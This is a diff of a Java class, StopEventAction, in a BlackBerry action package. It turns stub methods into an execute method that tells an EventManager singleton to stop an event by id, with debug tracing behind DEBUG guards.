@@ -1,22 +1,32 @@
 package blackberry.action;
 
+import blackberry.EventManager;
+import blackberry.Trigger;
 import blackberry.config.ConfAction;
-import blackberry.event.Event;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 
-public class StopEventAction extends SubAction {
+public class StopEventAction extends EventAction {
 
-    public StopEventAction(ConfAction conf) {
-        super(conf);
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("StopEventAction",
+            DebugLevel.VERBOSE);
+    //#endif
+    
+    public StopEventAction(ConfAction params) {
+        super( params);
     }
 
-    public boolean execute(Event event) {
-        // TODO Auto-generated method stub
-        return false;
-    }
 
-    protected boolean parse(byte[] confParams) {
-        // TODO Auto-generated method stub
-        return false;
+    public boolean execute(Trigger trigger) {
+        //#ifdef DEBUG
+        debug.trace("execute: " + eventId);
+        //#endif
+
+        final EventManager eventManager = EventManager.getInstance();
+
+        eventManager.stop(Integer.toString(eventId));
+        return true;
     }
 
 }
